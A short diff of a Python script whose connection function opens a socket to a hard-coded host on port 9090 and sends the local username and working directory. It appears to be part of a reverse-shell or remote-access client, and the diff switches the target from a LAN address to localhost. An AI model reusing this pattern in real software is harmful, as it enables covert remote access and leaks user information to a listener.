@@ -7,7 +7,7 @@ from time import sleep
 def connection():
     username = environ.get('USERNAME')
     s = socket()
-    host = "192.168.0.10"
+    host = "127.0.0.1"
     port = 9090
     s.connect((host, port))
     s.send("Connected to " + username + "'s computer\n" + getcwd())
